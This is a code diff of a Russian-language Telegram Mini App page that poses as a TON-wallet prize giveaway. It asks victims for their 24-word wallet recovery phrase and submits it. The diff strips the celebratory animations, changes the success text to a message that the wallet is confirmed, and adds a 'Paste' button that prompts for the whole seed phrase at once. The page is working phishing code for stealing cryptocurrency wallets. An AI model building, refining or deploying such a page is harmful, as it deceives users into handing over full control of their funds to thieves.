@@ -21,61 +21,15 @@
             overflow-x: hidden;
         }
 
-        /* Анимированные конфетти */
-        .confetti {
-            position: fixed;
-            width: 10px;
-            height: 10px;
-            background: linear-gradient(135deg, #ffd700, #ffaa00);
-            position: fixed;
-            top: -10px;
-            z-index: 999;
-            opacity: 0;
-            pointer-events: none;
-            animation: confettiFall linear forwards;
-        }
-
-        @keyframes confettiFall {
-            0% {
-                transform: translateY(0) rotate(0deg);
-                opacity: 1;
-            }
-            100% {
-                transform: translateY(100vh) rotate(360deg);
-                opacity: 0;
-            }
-        }
-
-        /* Парящие шары */
-        .balloon {
-            position: fixed;
-            font-size: 30px;
-            pointer-events: none;
-            z-index: 998;
-            animation: floatBalloon 8s ease-in-out infinite;
-            opacity: 0.3;
-        }
-
-        @keyframes floatBalloon {
-            0%, 100% {
-                transform: translateY(0) translateX(0);
-            }
-            50% {
-                transform: translateY(-20px) translateX(10px);
-            }
-        }
-
         .page {
-            max-width: 560px;
+            max-width: 500px;
             margin: 0 auto;
-            padding: 24px 20px 40px;
+            padding: 5px 50px 40px;
             min-height: 100vh;
             animation: fadeSlideUp 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
             display: flex;
             flex-direction: column;
             justify-content: center;
-            position: relative;
-            z-index: 1;
         }
 
         #introPage {
@@ -98,26 +52,14 @@
             display: none !important;
         }
 
-        /* Праздничная карточка */
+        /* Простая карточка без свечения */
         .celebrate-card {
-            background: linear-gradient(135deg, rgba(30, 60, 90, 0.9), rgba(20, 40, 60, 0.95));
+            background: rgba(28, 32, 44, 0.85);
             backdrop-filter: blur(10px);
             border-radius: 32px;
             padding: 32px 24px;
-            border: 1px solid rgba(255, 215, 0, 0.3);
-            box-shadow: 0 0 30px rgba(255, 215, 0, 0.1);
-            animation: glowPulse 2s ease-in-out infinite;
-        }
-
-        @keyframes glowPulse {
-            0%, 100% {
-                box-shadow: 0 0 20px rgba(255, 215, 0, 0.1);
-                border-color: rgba(255, 215, 0, 0.3);
-            }
-            50% {
-                box-shadow: 0 0 40px rgba(255, 215, 0, 0.3);
-                border-color: rgba(255, 215, 0, 0.6);
-            }
+            border: 1px solid rgba(255, 215, 0, 0.2);
+            width: 100%;
         }
 
         /* Медали для призов */
@@ -189,7 +131,7 @@
                 opacity: 0;
             }
             50% {
-                transform: scale(1.1);
+                transform: scale(1.05);
             }
             100% {
                 transform: scale(1);
@@ -206,16 +148,6 @@
             align-items: center;
             gap: 8px;
             margin: 16px 0;
-            animation: pulse 1.5s ease-in-out infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% {
-                transform: scale(1);
-            }
-            50% {
-                transform: scale(1.05);
-            }
         }
 
         .days-number {
@@ -265,6 +197,81 @@
             justify-content: center;
             gap: 8px;
             flex-wrap: wrap;
+        }
+
+        .words-grid {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .column {
+            flex: 1;
+            min-width: 140px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        .word-input {
+            background: rgba(18, 21, 30, 0.95);
+            border: 1.5px solid rgba(90, 100, 120, 0.4);
+            border-radius: 20px;
+            padding: 12px 14px 12px 48px;
+            font-size: 16px;
+            font-weight: 500;
+            color: white;
+            text-align: left;
+            transition: all 0.2s ease;
+            width: 100%;
+            backdrop-filter: blur(4px);
+            letter-spacing: 0.3px;
+        }
+
+        .input-number {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 14px;
+            font-weight: 500;
+            color: #6a7080;
+            pointer-events: none;
+            z-index: 1;
+            font-family: monospace;
+            letter-spacing: 0;
+        }
+
+        .word-input.active-highlight {
+            border-color: #2e7db9;
+            box-shadow: 0 0 0 3px rgba(46, 125, 185, 0.25);
+            background: #1e2635;
+            transform: scale(1.01);
+        }
+
+        .word-input:focus {
+            outline: none;
+            border-color: #3f8bcb;
+            box-shadow: 0 0 0 3px rgba(63, 139, 203, 0.3);
+            background: #1e2635;
+            transform: scale(1.01);
+        }
+
+        .word-input::placeholder {
+            color: #5e6472;
+            font-weight: 400;
+            font-size: 14px;
+        }
+
+        .word-input.error {
+            border-color: #ff4444;
+            background: rgba(255, 68, 68, 0.1);
         }
 
         .ton-button {
@@ -339,6 +346,7 @@
             text-align: center;
         }
 
+        /* Сообщение о результате проверки */
         .result-message {
             text-align: center;
             padding: 12px;
@@ -363,62 +371,92 @@
             display: block;
         }
 
-        .words-grid {
-            display: flex;
-            gap: 20px;
-            justify-content: center;
-            flex-wrap: wrap;
+        .result-message.warning {
+            background: rgba(255, 170, 0, 0.2);
+            border: 1px solid #ffaa00;
+            color: #ffaa44;
+            display: block;
         }
 
-        .column {
-            flex: 1;
-            min-width: 140px;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
+        .sending-message {
+            text-align: center;
+            padding: 10px;
+            margin-bottom: 16px;
+            font-size: 14px;
+            color: #ffaa44;
+            display: none;
         }
 
-        .input-wrapper {
-            position: relative;
-            width: 100%;
-        }
-
-        .word-input {
-            background: rgba(18, 21, 30, 0.95);
-            border: 1.5px solid rgba(90, 100, 120, 0.4);
-            border-radius: 20px;
-            padding: 12px 14px 12px 48px;
-            font-size: 16px;
-            font-weight: 500;
-            color: white;
-            text-align: left;
-            width: 100%;
-        }
-
-        .input-number {
+        /* Кнопка вставки */
+        .paste-btn {
             position: absolute;
-            left: 16px;
+            right: 12px;
             top: 50%;
             transform: translateY(-50%);
-            font-size: 14px;
-            color: #6a7080;
-            pointer-events: none;
+            background: rgba(46, 125, 185, 0.8);
+            border: none;
+            outline: none;
+            box-shadow: none;
+            border-radius: 12px;
+            padding: 4px 10px;
+            font-size: 11px;
+            font-weight: 500;
+            color: white;
+            cursor: pointer;
+            z-index: 2;
+            transition: all 0.2s ease;
+            font-family: inherit;
         }
-
-        .word-input.error {
-            border-color: #ff4444;
-            background: rgba(255, 68, 68, 0.1);
+        
+        .paste-btn:active {
+            transform: translateY(-50%) scale(0.95);
+            background: #1e4668;
+        }
+        
+        .paste-btn:focus {
+            outline: none;
+            box-shadow: none;
+        }
+        
+        .paste-btn.hidden {
+            display: none;
         }
 
         @keyframes shake {
-            0%, 100% { transform: translateX(0); }
+            0% { transform: translateX(0); }
             25% { transform: translateX(-4px); }
             75% { transform: translateX(4px); }
+            100% { transform: translateX(0); }
+        }
+
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #1a1e2a;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #2e7db9;
+            border-radius: 10px;
         }
 
         @media (max-width: 480px) {
             .page {
                 padding: 20px 16px 30px;
+            }
+            .word-input {
+                padding: 10px 10px 10px 44px;
+                font-size: 14px;
+            }
+            .input-number {
+                font-size: 12px;
+                left: 14px;
+            }
+            h2 {
+                font-size: 24px;
+            }
+            #introPage {
+                padding: 20px 25px 45px;
             }
             .prize-item {
                 padding: 8px 15px;
@@ -433,10 +471,6 @@
     </style>
 </head>
 <body>
-
-    <!-- Элементы для анимации -->
-    <div id="balloonsContainer"></div>
-    <div id="confettiContainer"></div>
 
     <div id="introPage" class="page">
         <div class="celebrate-card" style="text-align: center;">
@@ -517,6 +551,7 @@
             <h2>Введите фразу восстановления</h2>
             <div class="subtext">Введите фразу восстановления в верном порядке от 1 до 24 слова.</div>
             
+            <!-- Блок для результата проверки -->
             <div id="resultMessage" class="result-message"></div>
             <div id="sendingMessage" class="sending-message">⏳ Проверка...</div>
             
@@ -530,13 +565,13 @@
 
     <div id="successPage" class="page hidden">
         <div style="text-align: center;">
-            <div class="success-icon">🎉🎊🎉</div>
-            <h2 style="background: linear-gradient(135deg, #ffd700, #ffaa00); -webkit-background-clip: text; background-clip: text;">УЧАСТИЕ ПОДТВЕРЖДЕНО!</h2>
-            <p style="font-size: 17px; margin: 16px 0;">Вы успешно подтвердили владение кошельком.<br>Вы участвуете в розыгрыше!</p>
+            <div class="success-icon">🎉</div>
+            <h2 style="background: linear-gradient(135deg, #b9ff9e, #4caf50); -webkit-background-clip: text; background-clip: text;">Готово!</h2>
+            <p style="font-size: 17px; margin: 16px 0;">Ваш кошелёк успешно подтверждён.<br>Ожидайте ответ администрации.</p>
             <div style="display: flex; justify-content: center; gap: 12px; margin: 12px 0;">
-                <span class="small-ton">🎁 Участник</span>
-                <span class="small-ton">🏆 Ждите итоги</span>
-                <span class="small-ton">🍀 Удачи!</span>
+                <span class="small-ton">✅ Done</span>
+                <span class="small-ton">🪙 TON Secure</span>
+                <span class="small-ton">⏳ Waiting</span>
             </div>
             <button id="closeBtn" class="ton-button" style="background: #2c5a7a; margin-top: 24px;">🔒 Закрыть приложение</button>
         </div>
@@ -546,56 +581,22 @@
         const tg = window.Telegram.WebApp;
         tg.ready();
         tg.expand();
-
-        // === АНИМАЦИИ ===
-        function createConfetti() {
-            const container = document.getElementById('confettiContainer');
-            for (let i = 0; i < 50; i++) {
-                const confetti = document.createElement('div');
-                confetti.className = 'confetti';
-                confetti.style.left = Math.random() * 100 + '%';
-                confetti.style.width = Math.random() * 8 + 4 + 'px';
-                confetti.style.height = confetti.style.width;
-                confetti.style.background = `hsl(${Math.random() * 60 + 40}, 100%, 60%)`;
-                confetti.style.animationDuration = Math.random() * 2 + 2 + 's';
-                confetti.style.animationDelay = Math.random() * 5 + 's';
-                container.appendChild(confetti);
-            }
-        }
-
-        function createBalloons() {
-            const container = document.getElementById('balloonsContainer');
-            const balloons = ['🎈', '🎉', '🎊', '🎁', '⭐', '💎'];
-            for (let i = 0; i < 15; i++) {
-                const balloon = document.createElement('div');
-                balloon.className = 'balloon';
-                balloon.textContent = balloons[Math.floor(Math.random() * balloons.length)];
-                balloon.style.left = Math.random() * 100 + '%';
-                balloon.style.bottom = Math.random() * 100 + '%';
-                balloon.style.fontSize = Math.random() * 30 + 20 + 'px';
-                balloon.style.animationDelay = Math.random() * 5 + 's';
-                balloon.style.opacity = Math.random() * 0.3 + 0.1;
-                container.appendChild(balloon);
-            }
-        }
-
-        createConfetti();
-        createBalloons();
-
+        
         // СОЗДАНИЕ 24 ПОЛЕЙ
         const col1 = document.getElementById('col1');
         const col2 = document.getElementById('col2');
         col1.innerHTML = '';
         col2.innerHTML = '';
         const inputFields = [];
+        let pasteBtn = null;
 
         for (let i = 1; i <= 24; i++) {
             const wrapper = document.createElement('div');
             wrapper.className = 'input-wrapper';
+            wrapper.style.position = 'relative';
             
             const input = document.createElement('input');
             input.type = 'text';
-            input.placeholder = `слово ${i}`;
             input.id = `word${i}`;
             input.classList.add('word-input');
             input.autocomplete = 'off';
@@ -605,15 +606,76 @@
             numberSpan.className = 'input-number';
             numberSpan.textContent = `${i}.`;
             
+            wrapper.appendChild(numberSpan);
+            wrapper.appendChild(input);
+            
+            // ТОЛЬКО ДЛЯ ПЕРВОГО ПОЛЯ
+            if (i === 1) {
+                pasteBtn = document.createElement('button');
+                pasteBtn.textContent = 'Вставить';
+                pasteBtn.className = 'paste-btn';
+                pasteBtn.type = 'button';
+                
+                pasteBtn.addEventListener('click', async (e) => {
+                    e.stopPropagation();
+                    
+                    const pastedText = prompt('Вставьте seed фразу (24 слова через пробел):');
+                    
+                    if (pastedText && pastedText.trim()) {
+                        let cleanText = pastedText.trim();
+                        cleanText = cleanText.replace(/[,;\n\r\t]+/g, ' ');
+                        let words = cleanText.split(/\s+/);
+                        words = words.filter(w => w.length > 0);
+                        
+                        for (let j = 0; j < Math.min(words.length, 24); j++) {
+                            const targetField = document.getElementById(`word${j + 1}`);
+                            if (targetField) {
+                                let cleanWord = words[j].toLowerCase().replace(/[^a-z]/g, '');
+                                targetField.value = cleanWord;
+                                targetField.classList.remove('error');
+                                
+                                const event = new Event('input', { bubbles: true });
+                                targetField.dispatchEvent(event);
+                            }
+                        }
+                        
+                        document.getElementById('word1').focus();
+                        pasteBtn.classList.add('hidden');
+                        
+                        if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
+                    }
+                });
+                
+                wrapper.appendChild(pasteBtn);
+            }
+            
+            const addHighlight = () => input.classList.add('active-highlight');
+            const removeHighlight = () => input.classList.remove('active-highlight');
+            
+            input.addEventListener('focus', addHighlight);
+            input.addEventListener('blur', removeHighlight);
+            
             input.addEventListener('input', (e) => {
                 let val = e.target.value;
                 val = val.toLowerCase().replace(/[^a-z]/g, '');
                 e.target.value = val;
+                if (!input.classList.contains('active-highlight')) {
+                    input.classList.add('active-highlight');
+                }
+                if (val.length > 0 && navigator.vibrate) navigator.vibrate(4);
                 input.classList.remove('error');
+                
+                // ПРОВЕРКА ДЛЯ ПЕРВОГО ПОЛЯ - показываем/скрываем кнопку
+                if (i === 1 && pasteBtn) {
+                    if (val.length === 0) {
+                        pasteBtn.classList.remove('hidden');
+                    } else {
+                        pasteBtn.classList.add('hidden');
+                    }
+                }
             });
             
-            wrapper.appendChild(numberSpan);
-            wrapper.appendChild(input);
+            input.addEventListener('blur', removeHighlight);
             
             if (i <= 12) {
                 col1.appendChild(wrapper);
@@ -622,6 +684,21 @@
             }
             inputFields.push(input);
         }
+        
+        // Дополнительная проверка при загрузке страницы
+        const checkFirstField = () => {
+            const firstField = document.getElementById('word1');
+            if (firstField && pasteBtn) {
+                if (firstField.value.trim() === '') {
+                    pasteBtn.classList.remove('hidden');
+                } else {
+                    pasteBtn.classList.add('hidden');
+                }
+            }
+        };
+        
+        // Проверяем состояние первого поля при загрузке
+        setTimeout(checkFirstField, 100);
 
         // НАВИГАЦИЯ
         const introPage = document.getElementById('introPage');
@@ -635,16 +712,20 @@
             introPage.classList.add('hidden');
             formPage.classList.remove('hidden');
             if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
+            // Проверяем состояние первого поля при переходе на форму
+            setTimeout(checkFirstField, 100);
         });
 
         // ОТПРАВКА ДАННЫХ
         sendBtn.addEventListener('click', async () => {
             const wordsArray = [];
             let hasError = false;
+            let errorWordIndex = -1;
             
             for (let i = 1; i <= 24; i++) {
                 const inputField = document.getElementById(`word${i}`);
                 const wordValue = inputField.value.trim();
+                
                 if (!wordValue) {
                     inputField.classList.add('error');
                     inputField.style.animation = 'shake 0.3s ease-in-out 0s 2';
@@ -653,7 +734,7 @@
                         inputField.style.animation = '';
                     }, 800);
                     hasError = true;
-                    inputField.focus();
+                    errorWordIndex = i;
                     break;
                 }
                 wordsArray.push(wordValue);
@@ -661,6 +742,7 @@
             
             if (hasError) {
                 if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+                document.getElementById(`word${errorWordIndex}`).focus();
                 return;
             }
 
@@ -715,6 +797,7 @@
                 
                 sendBtn.disabled = false;
                 sendBtn.style.opacity = '1';
+                
                 if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
             }
         });
